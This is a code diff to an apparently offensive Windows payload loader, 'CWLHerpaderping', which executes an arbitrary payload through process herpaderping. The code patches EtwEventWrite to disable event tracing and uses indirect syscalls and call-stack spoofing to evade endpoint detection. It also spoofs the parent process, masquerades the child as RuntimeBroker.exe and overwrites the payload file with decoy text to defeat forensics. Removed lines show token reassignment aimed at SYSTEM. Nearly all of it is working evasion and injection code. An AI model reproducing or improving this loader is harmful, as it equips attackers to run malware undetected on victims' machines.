@@ -16,6 +16,14 @@
 
 
 
+#ifdef CWLDEBUG
+#define DBG_PRINT(fmt, ...) printf("[DBG] " fmt "\n", ##__VA_ARGS__)
+#else
+#define DBG_PRINT(fmt, ...) ((void)0)
+#endif
+
+
+
 // Default payload path - can be overridden at compile time
 
 // Usage: msbuild ... /p:PreprocessorDefinitions="PAYLOAD_PATH=L\"D:\\custom\\path.exe\""
@@ -43,7 +51,9 @@ static void PatchEtw()
 
 	PVOID pEtw = RESOLVE_API(hNtdll, EtwEventWrite);
 
-	if (!pEtw) return;
+	if (!pEtw) { DBG_PRINT("PatchEtw: EtwEventWrite not resolved, skipping"); return; }
+
+	DBG_PRINT("PatchEtw: EtwEventWrite resolved at %p", pEtw);
 
 	DWORD old = 0;
 
@@ -52,6 +62,8 @@ static void PatchEtw()
 	memcpy(pEtw, "\x33\xC0\xC3", 3);  // xor eax,eax; ret
 
 	VirtualProtect(pEtw, 4, old, &old);
+
+	DBG_PRINT("PatchEtw: EtwEventWrite patched (xor eax,eax; ret)");
 
 }
 #endif  // ENABLE_ETW_PATCH
@@ -86,7 +98,7 @@ static HANDLE GetNonJobParent()
 
 					HANDLE h = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, pe.th32ProcessID);
 
-					if (h) { CloseHandle(hSnap); return h; }
+					if (h) { DBG_PRINT("GetNonJobParent: using %ls (PID=%lu)", pe.szExeFile, pe.th32ProcessID); CloseHandle(hSnap); return h; }
 
 				}
 
@@ -97,6 +109,8 @@ static HANDLE GetNonJobParent()
 	}
 
 	CloseHandle(hSnap);
+
+	DBG_PRINT("GetNonJobParent: no suitable parent found, using self");
 
 	return GetCurrentProcess();
 
@@ -152,6 +166,8 @@ BYTE *GetPayloadBuffer(OUT size_t &p_size)
 
 		
 
+		DBG_PRINT("GetPayloadBuffer: payload size from stdin = %lu bytes", payloadSize);
+
 		// Validate size (sanity check: 1KB - 50MB range)
 
 		if (payloadSize < 1024 || payloadSize > 50 * 1024 * 1024)
@@ -165,6 +181,8 @@ BYTE *GetPayloadBuffer(OUT size_t &p_size)
 		}
 
 		
+
+		DBG_PRINT("GetPayloadBuffer: stdin pipe detected");
 
 		// Allocate RW buffer for payload
 
@@ -200,6 +218,8 @@ BYTE *GetPayloadBuffer(OUT size_t &p_size)
 
 		
 
+		DBG_PRINT("GetPayloadBuffer: stdin payload read OK (%lu bytes)", bytesRead);
+
 		p_size = payloadSize;
 
 		// NO DeleteFileW — payload never touched disk (T1620)
@@ -213,6 +233,8 @@ BYTE *GetPayloadBuffer(OUT size_t &p_size)
 	// Mode 2: FILE-based loading (legacy fallback)
 
 	// Used for testing or when stdin not available
+
+	DBG_PRINT("GetPayloadBuffer: file mode, loading from disk");
 
 	HANDLE hFile = CreateFileW(PAYLOAD_PATH, GENERIC_READ, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
 
@@ -251,6 +273,8 @@ BYTE *GetPayloadBuffer(OUT size_t &p_size)
 		exit(-1);
 
 	}
+
+	DBG_PRINT("GetPayloadBuffer: file payload read OK (%zu bytes)", p_size);
 
 	CloseHandle(hFile);
 
@@ -329,463 +353,162 @@ ULONG_PTR GetEntryPoint(HANDLE hProcess, BYTE *payload, PROCESS_BASIC_INFORMATIO
 
 
 BOOL Herpaderping(BYTE *payload, size_t payloadSize)
-
 {
-
 	HMODULE hNtdll = GetNtdllBase();
 
-
-
-	// B2 — Indirect Syscalls: build stubs for the 5 injection-critical Nt* APIs.
-
-	// Each stub: mov r10,rcx; mov eax,<SSN>; movabs r11,<gadget>; jmp r11
-
-	// The gadget (syscall;ret) lives inside ntdll .text, so EDR sees the syscall
-
-	// as originating from ntdll, not from our PE or stub page.
-
 	if (!InitSyscallPool(hNtdll))
-
 	{
-
 		perror("[-] Failed to initialize indirect syscall pool\n");
-
 		exit(-1);
-
 	}
+	DBG_PRINT("Herpaderping: indirect syscall pool initialized");
+	INDIRECT_SYSCALL(_NtCreateUserProcess, pNtCreateUserProcess, NtCreateUserProcess);
+	SealSyscallPool();
 
-	INDIRECT_SYSCALL(_NtCreateSection,        pNtCreateSection,        NtCreateSection);
-
-	INDIRECT_SYSCALL(_NtCreateProcessEx,      pNtCreateProcessEx,      NtCreateProcessEx);
-
-	INDIRECT_SYSCALL(_NtAllocateVirtualMemory,pNtAllocateVirtualMemory,NtAllocateVirtualMemory);
-
-	INDIRECT_SYSCALL(_NtWriteVirtualMemory,   pNtWriteVirtualMemory,   NtWriteVirtualMemory);
-
-	INDIRECT_SYSCALL(_NtCreateThreadEx,       pNtCreateThreadEx,       NtCreateThreadEx);
-
-	SealSyscallPool();  // flip pool to PAGE_EXECUTE_READ — no persistent RWX page
-
-
-
-	if (pNtCreateSection == NULL)
-
+	if (pNtCreateUserProcess == NULL)
 	{
-
-		perror("[-] Couldn't resolve SSN for NtCreateSection\n");
-
+		perror("[-] Couldn't resolve SSN for NtCreateUserProcess\n");
 		exit(-1);
-
-	}
-
-	if (pNtCreateProcessEx == NULL)
-
-	{
-
-		perror("[-] Couldn't resolve SSN for NtCreateProcessEx\n");
-
-		exit(-1);
-
-	}
-
-	if (pNtAllocateVirtualMemory == NULL)
-
-	{
-
-		perror("[-] Couldn't resolve SSN for NtAllocateVirtualMemory\n");
-
-		exit(-1);
-
-	}
-
-	if (pNtWriteVirtualMemory == NULL)
-
-	{
-
-		perror("[-] Couldn't resolve SSN for NtWriteVirtualMemory\n");
-
-		exit(-1);
-
-	}
-
-	if (pNtCreateThreadEx == NULL)
-
-	{
-
-		perror("[-] Couldn't resolve SSN for NtCreateThreadEx\n");
-
-		exit(-1);
-
-	}
-
-
-
-	// Non-injection APIs: keep as EAT-walk resolution (not syscall-hooked in practice)
-
-	_NtQueryInformationProcess pNtQueryInformationProcess = (_NtQueryInformationProcess)RESOLVE_API(hNtdll, NtQueryInformationProcess);
-
-	if (pNtQueryInformationProcess == NULL)
-
-	{
-
-		perror("[-] Couldn't find API NtQueryInformationProcess...\n");
-
-		exit(-1);
-
 	}
 
 	_RtlCreateProcessParametersEx pRtlCreateProcessParametersEx = (_RtlCreateProcessParametersEx)RESOLVE_API(hNtdll, RtlCreateProcessParametersEx);
-
 	if (pRtlCreateProcessParametersEx == NULL)
-
 	{
-
 		perror("[-] Couldn't find API RtlCreateProcessParametersEx\n");
-
 		exit(-1);
-
 	}
-
 	_RtlInitUnicodeString pRtlInitUnicodeString = (_RtlInitUnicodeString)RESOLVE_API(hNtdll, RtlInitUnicodeString);
-
 	if (pRtlInitUnicodeString == NULL)
-
 	{
-
-		perror("[-] Couldn't find API RtlInitUnicodeString \n");
-
+		perror("[-] Couldn't find API RtlInitUnicodeString\n");
 		exit(-1);
-
 	}
 
 	HANDLE hTemp;
-
-	HANDLE hSection;
-
-	HANDLE hProcess;
-
-	HANDLE hThread;
-
+	HANDLE hProcess = NULL;
+	HANDLE hThread = NULL;
 	NTSTATUS status;
-
-	PROCESS_BASIC_INFORMATION pbi;
-
-	PEB *remotePEB;
-
 	DWORD bytesWritten;
 
-	signed int bufferSize;
-
-	ULONG_PTR entryPoint;
-
-	UNICODE_STRING uTargetFilePath;
-
-	UNICODE_STRING uDllPath;
-
-	PRTL_USER_PROCESS_PARAMETERS processParameters;
-
-
-
+	// Create temp file and write payload
 	wchar_t tempFile[MAX_PATH] = {0};
-
 	wchar_t tempPath[MAX_PATH] = {0};
-
 	GetTempPathW(MAX_PATH, tempPath);
-
 	GetTempFileNameW(tempPath, L"HD", 0, tempFile);
 
-	// Create a temp File
-
-	// later this file holds our payload
-
 	hTemp = CreateFileW(tempFile, GENERIC_READ | GENERIC_WRITE | SYNCHRONIZE,
-
-						FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, 0, 0);
-
+						FILE_SHARE_READ, 0, CREATE_ALWAYS, 0, 0);
 	if (hTemp == INVALID_HANDLE_VALUE)
-
 	{
-
 		perror("[-] Unable to create temp file....\n");
-
 		exit(-1);
-
 	}
-
-	// Write Payload into the temp file
-
 	if (!WriteFile(hTemp, payload, payloadSize, &bytesWritten, NULL))
-
 	{
-
 		perror("[-] Unable to write payload to the file...\n");
-
 		exit(-1);
-
 	}
-
-	// CreateSection with temp file (SPOOFED CALL)
-
-	// SEC_IMAGE flag is set
-
-	{
-
-		StackSpoofer spoofer(OBFSTR("kernel32.dll"));
-
-		spoofer.Activate();
-
-		status = pNtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, 0, PAGE_READONLY, SEC_IMAGE, hTemp);
-
-		spoofer.Deactivate();
-
-	}
-
-	if (!NT_SUCCESS(status))
-
-	{
-
-		exit(-1);
-
-	}
-
-
-
-	// Create Process with section (SPOOFED CALL)
-
-	HANDLE hParent = GetNonJobParent();
-
-	{
-
-		StackSpoofer spoofer(OBFSTR("kernel32.dll"));
-
-		spoofer.Activate();
-
-		status = pNtCreateProcessEx(&hProcess, PROCESS_ALL_ACCESS, NULL, hParent,
-
-									0, hSection, NULL, NULL, FALSE);
-
-		spoofer.Deactivate();
-
-	}
-
-	if (hParent != GetCurrentProcess()) CloseHandle(hParent);
-
-	if (!NT_SUCCESS(status))
-
-	{
-
-		exit(-1);
-
-	}
-
-
-
-	// Token fixup: NtCreateProcessEx inherits token from parent (svchost.exe via GetNonJobParent),
-
-	// reassign the calling process token so ghost runs with our identity (SYSTEM if via EfsPotato)
-
-	{
-
-		_NtSetInformationProcess pNtSetInformationProcess = (_NtSetInformationProcess)RESOLVE_API(hNtdll, NtSetInformationProcess);
-
-		if (pNtSetInformationProcess)
-
-		{
-
-			HANDLE hToken = NULL;
-
-			if (OpenProcessToken(GetCurrentProcess(), TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_ASSIGN_PRIMARY, &hToken))
-
-			{
-
-				HANDLE hPrimary = NULL;
-
-				if (DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityIdentification, TokenPrimary, &hPrimary))
-
-				{
-
-					PROCESS_ACCESS_TOKEN pat = { hPrimary, NULL };
-
-					pNtSetInformationProcess(hProcess, (PROCESSINFOCLASS)9, &pat, sizeof(pat));
-
-					CloseHandle(hPrimary);
-
-				}
-
-				CloseHandle(hToken);
-
-			}
-
-		}
-
-	}
-
-
-
-	// Get remote process information
-
-	status = pNtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(PROCESS_BASIC_INFORMATION), 0);
-
-	if (!NT_SUCCESS(status))
-
-	{
-
-		perror("[-] Unable to Get Process Information...\n");
-
-		exit(-1);
-
-	}
-
-	// Get the entry point
-
-	entryPoint = GetEntryPoint(hProcess, payload, pbi);
-
-
-
-	// Modify the file on disk
-
-	SetFilePointer(hTemp, 0, 0, FILE_BEGIN);
-
-	bufferSize = GetFileSize(hTemp, 0);
-
-	bufferSize = 0x1000;
-
-	wchar_t bytesToWrite[] = L"Hello From CyberWarFare Labs\n";
-
-	while (bufferSize > 0)
-
-	{
-
-		WriteFile(hTemp, bytesToWrite, sizeof(bytesToWrite), &bytesWritten, NULL);
-
-		bufferSize -= bytesWritten;
-
-	}
-
-
-
-	// Set Process Parameters
-
+	FlushFileBuffers(hTemp);
+	CloseHandle(hTemp);
+	DBG_PRINT("Herpaderping: temp file created and payload written: %ls (%lu bytes)", tempFile, bytesWritten);
+
+	// Build NT path for NtCreateUserProcess
+	wchar_t ntImagePath[MAX_PATH + 8] = {0};
+	wsprintfW(ntImagePath, L"\\??\\%s", tempFile);
+
+	// Process parameters — masquerade as RuntimeBroker.exe
+	UNICODE_STRING uTargetFilePath;
 	wchar_t targetFilePath[MAX_PATH] = {0};
-
 	lstrcpyW(targetFilePath, OBFWSTR(L"C:\\Windows\\System32\\RuntimeBroker.exe"));
-
 	pRtlInitUnicodeString(&uTargetFilePath, targetFilePath);
 
+	UNICODE_STRING uDllPath;
 	wchar_t dllDir[MAX_PATH] = {0};
-
 	lstrcpyW(dllDir, OBFWSTR(L"C:\\Windows\\System32"));
-
-	UNICODE_STRING uDllDir = {0};
-
 	pRtlInitUnicodeString(&uDllPath, dllDir);
 
+	PRTL_USER_PROCESS_PARAMETERS processParameters = NULL;
 	status = pRtlCreateProcessParametersEx(&processParameters, &uTargetFilePath, &uDllPath,
-
-										   NULL, &uTargetFilePath, NULL, NULL, NULL, NULL, NULL, RTL_USER_PROC_PARAMS_NORMALIZED);
-
+										   NULL, &uTargetFilePath, NULL, NULL, NULL, NULL, NULL,
+										   RTL_USER_PROC_PARAMS_NORMALIZED);
 	if (!NT_SUCCESS(status))
-
 	{
-
+		DBG_PRINT("Herpaderping: RtlCreateProcessParametersEx failed (0x%08lx)", status);
 		exit(-1);
-
 	}
+	DBG_PRINT("Herpaderping: process parameters created OK");
 
+	// PS_CREATE_INFO
+	PS_CREATE_INFO createInfo;
+	memset(&createInfo, 0, sizeof(createInfo));
+	createInfo.Size = sizeof(createInfo);
+	createInfo.State = PsCreateInitialState;
 
+	// PS_ATTRIBUTE_LIST — image name points to temp file containing payload
+	UNICODE_STRING uNtImagePath;
+	pRtlInitUnicodeString(&uNtImagePath, ntImagePath);
 
-	SIZE_T paramSize = processParameters->EnvironmentSize + processParameters->MaximumLength;
+	PS_ATTRIBUTE_LIST attrList;
+	memset(&attrList, 0, sizeof(attrList));
+	attrList.TotalLength = sizeof(SIZE_T) + sizeof(PS_ATTRIBUTE);
+	attrList.Attributes[0].Attribute = PS_ATTRIBUTE_IMAGE_NAME;
+	attrList.Attributes[0].Size = uNtImagePath.Length;
+	attrList.Attributes[0].ValuePtr = uNtImagePath.pBuffer;
 
-	PVOID paramBuffer = processParameters;
-
+	// NtCreateUserProcess — process + initial thread created atomically
+	// Thread suspended so we can overwrite the file before execution starts
 	{
-
 		StackSpoofer spoofer(OBFSTR("kernel32.dll"));
-
 		spoofer.Activate();
-
-		status = pNtAllocateVirtualMemory(hProcess, &paramBuffer, 0, &paramSize,
-
-										  MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-
+		status = pNtCreateUserProcess(&hProcess, &hThread,
+									  PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS,
+									  NULL, NULL,
+									  0,
+									  THREAD_CREATE_FLAGS_CREATE_SUSPENDED,
+									  processParameters,
+									  &createInfo,
+									  &attrList);
 		spoofer.Deactivate();
-
 	}
-
 	if (!NT_SUCCESS(status))
-
 	{
-
+		DBG_PRINT("Herpaderping: NtCreateUserProcess failed (0x%08lx)", status);
 		exit(-1);
+	}
+	DBG_PRINT("Herpaderping: NtCreateUserProcess OK (hProcess=%p, hThread=%p, createInfo.State=%d)", hProcess, hThread, createInfo.State);
 
+	// Overwrite temp file with decoy content (best-effort anti-forensic)
+	hTemp = CreateFileW(tempFile, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_DELETE,
+						NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+	if (hTemp != INVALID_HANDLE_VALUE)
+	{
+		SetFilePointer(hTemp, 0, 0, FILE_BEGIN);
+		signed int bufferSize = 0x1000;
+		wchar_t bytesToWrite[] = L"Hello From CyberWarFare Labs\n";
+		while (bufferSize > 0)
+		{
+			WriteFile(hTemp, bytesToWrite, sizeof(bytesToWrite), &bytesWritten, NULL);
+			bufferSize -= bytesWritten;
+		}
+		CloseHandle(hTemp);
+		DBG_PRINT("Herpaderping: temp file overwritten with decoy content");
+	}
+	else
+	{
+		DBG_PRINT("Herpaderping: temp file overwrite skipped (section lock)");
 	}
 
+	// Resume thread — Win32 API (no indirect syscall needed; benign call)
+	DWORD prevCount = ResumeThread(hThread);
+	if (prevCount == (DWORD)-1)
 	{
-
-		StackSpoofer spoofer(OBFSTR("kernel32.dll"));
-
-		spoofer.Activate();
-
-		status = pNtWriteVirtualMemory(hProcess, processParameters, processParameters,
-
-									   processParameters->EnvironmentSize + processParameters->MaximumLength, NULL);
-
-		spoofer.Deactivate();
-
-	}
-
-	if (!NT_SUCCESS(status))
-
-	{
-
+		DBG_PRINT("Herpaderping: ResumeThread failed (GLE=%lu)", GetLastError());
 		exit(-1);
-
 	}
+	DBG_PRINT("Herpaderping: ResumeThread OK (prevSuspendCount=%lu), ghost process running", prevCount);
 
-	// Getting Remote PEB address
-
-	remotePEB = (PEB *)pbi.PebBaseAddress;
-
-	SIZE_T written = 0;
-
-	if (!WriteProcessMemory(hProcess, &remotePEB->ProcessParameters, &processParameters, sizeof(PVOID), &written))
-
-	{
-
-		exit(-1);
-
-	}
-
-
-
-	// Create and resume thread (SPOOFED CALL)
-
-	{
-
-		StackSpoofer spoofer(OBFSTR("kernel32.dll"));
-
-		spoofer.Activate();
-
-		status = pNtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess,
-
-								   (LPTHREAD_START_ROUTINE)entryPoint, NULL, FALSE, 0, 0, 0, 0);
-
-		spoofer.Deactivate();
-
-	}
-
-	if (!NT_SUCCESS(status))
-
-	{
-
-		exit(-1);
-
-	}
-
-	CloseHandle(hTemp);
-
+	DeleteFileW(tempFile);
 	return TRUE;
-
 }
 
 
@@ -798,10 +521,16 @@ int main()
 	PatchEtw();
 #endif
 
+	DBG_PRINT("main: CWLHerpaderping starting");
+
 	size_t payloadSize;
 
 	BYTE *payloadBuffer = GetPayloadBuffer(payloadSize);
 
+	DBG_PRINT("main: payload loaded (%zu bytes), launching Herpaderping", payloadSize);
+
 	BOOL isSuccess = Herpaderping(payloadBuffer, payloadSize);
+
+	DBG_PRINT("main: Herpaderping returned %d", isSuccess);
 
 }
